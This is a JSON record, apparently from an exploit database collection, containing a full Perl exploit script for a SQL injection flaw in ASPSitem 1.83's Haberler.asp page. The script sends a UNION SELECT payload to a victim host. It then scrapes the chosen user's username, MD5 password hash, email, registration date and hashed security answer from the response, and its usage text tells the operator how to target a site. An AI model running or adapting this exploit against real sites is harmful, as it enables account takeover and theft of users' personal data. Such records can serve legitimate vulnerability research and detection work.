{
  "id": "1700",
  "title": "ASPSitem 1.83 - &#039;Haberler.asp&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=23\r\n#Usage: aspsi.pl <host> <path> <userid>\r\nuse IO::Socket;\r\nif(@ARGV != 3) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-23\\r\\n\";\r\n  print \"- ASPSitem <= 1.83 Remote SQL Injection Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to ASPSitem ex: /aspsitem/\\r\\n\";\r\n  print \"- <userid> -> ID of user that you want info ex: 1\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $asserver = $ARGV[0];\r\n  $asserver =~ s/(http:\\/\\/)//eg;\r\n  $ashost   = \"http://\".$asserver;\r\n  $asdir    = $ARGV[1];\r\n  $asport   = \"80\";\r\n  $astar    = \"Haberler.asp?haber=devam&id=\";\r\n  $asxp     = \"-1%20UNION%20SELECT%20cevap,id,0,kulladi,sifre,kayittarih,email%20FROM%20uyeler%20where%20id%20like%20\".$ARGV[2];\r\n  $asreq    = $ashost.$asdir.$astar.$asxp;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $asserver\\r\\n\";\r\n  $as = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$asserver\", PeerPort => \"$asport\") || die \"- Connection failed...\\n\";\r\n  print $as \"GET $asreq HTTP/1.1\\n\";\r\n  print $as \"Accept: */*\\n\";\r\n  print $as \"Referer: $ashost\\n\";\r\n  print $as \"Accept-Language: tr\\n\";\r\n  print $as \"User-Agent: NukeZilla\\n\";\r\n  print $as \"Cache-Control: no-cache\\n\";\r\n  print $as \"Host: $asserver\\n\";\r\n  print $as \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$as>) {\r\n    if ($answer =~ /class=\\\"tablo_baslik\\\"><b>\u00bb (.*?)<\\/b><\\/td>/) {\r\n      if ($1 == $ARGV[2]) {\r\n        print \"- Exploit succeed! Getting USERID: $ARGV[2]'s credentials\\r\\n\";\r\n      }\r\n      else { die \"- Exploit failed\\n\"; }     \r\n    }\r\n    if ($answer =~ /\\\" align=\\\"left\\\">(.*?)</) {\r\n      print \"- Username: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ /Ekleyen&nbsp;&nbsp;\\(<b>(.*?)<\\/b>\\)/) {\r\n      print \"- MD5 HASH of PASSWORD: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ /\\| (.*?) ]<br>/) {\r\n      print \"- Regdate: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ /haber=yorum&id=(.*?)\\\">Yorumlar/) {\r\n      print \"- Email: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ / Okunma : (.*?) /) {\r\n      print \"- MD5 hash of answer: $1\\r\\n\";\r\n      exit();\r\n    }\r\n  }\r\n  #Exploit failed...\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n#nukedx.com [2006-04-19]\r\n\r\n# milw0rm.com [2006-04-19]",
  "url": "https://www.exploit-db.com/exploits/1700"
}